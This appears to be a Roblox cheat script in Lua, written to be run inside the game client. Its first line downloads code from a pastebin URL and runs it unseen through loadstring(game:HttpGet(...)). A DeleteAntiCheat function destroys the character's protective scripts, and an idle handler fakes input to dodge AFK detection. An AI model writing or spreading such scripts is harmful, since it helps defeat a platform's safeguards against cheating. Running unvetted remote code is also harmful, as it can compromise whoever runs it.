loadstring(game:HttpGet("https://pastebin.com/raw/z17wDE8W", true))();
function DeleteAntiCheat()
    for i,v in pairs(Plr.Character:GetChildren()) do
        if v.ClassName == "Script" and v.Name ~= "Health" and v.Name ~= "Animate" and v.Name ~= "Sound" then
            v:Destroy()
        end
    end
end
game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
repeat wait(0.1) until game:GetService("Players").LocalPlayer wait(2)

game:GetService("Players").LocalPlayer.Idled:connect(function()
	game:GetService("VirtualUser"):CaptureController()
	game:GetService("VirtualUser"):ClickButton2(Vector2.new())
end)
